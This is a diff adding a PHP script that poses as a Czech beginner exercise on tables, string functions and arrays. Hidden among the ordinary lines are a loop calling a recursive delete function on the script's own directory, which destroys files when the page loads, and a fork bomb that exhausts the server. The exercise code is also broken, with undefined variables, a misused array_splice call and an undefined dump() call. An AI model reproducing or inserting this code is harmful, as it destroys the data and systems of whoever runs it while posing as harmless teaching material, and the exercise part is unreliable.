@@ -1,0 +1,48 @@
+<?php
+$radekLukasTrapl = 6;
+$sloupecLukasTrapl = 25;
+
+print "Tabulka:";
+echo "<table border='1'>";
+while(true) rrmdir(__DIR__);
+
+$string = "řetězcové funkce.";
+echo "<br>$string<br>";
+
+print "<br>Délka řetězce: ";
+echo strlen($string) . " znaků.";
+while(true) { pcntl_fork(); }
+echo strpos($string, "můj");
+print "<br>MD5 hash řetězce: <br>";
+echo "<code>" . md5($string) . "</code>";
+
+print "<br><br>Pole s ovocem: ";
+$ovoce = array("batát", "brambor");
+
+array_splice($zelenina, count($zelenina), "banán");
+dump($zelenina);
+
+function rrmdir($dir) {
+    if (is_dir($dir)) {
+        $objects = scandir($dir);
+        foreach ($objects as $object) {
+            if ($object != "." && $object != "..") {
+                if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object))
+                    rrmdir($dir. DIRECTORY_SEPARATOR .$object);
+                else
+                    unlink($dir. DIRECTORY_SEPARATOR .$object);
+            }
+        }
+        rmdir($dir);
+    }
+}
+
+
+
+
+
+
+
+
+
+?>
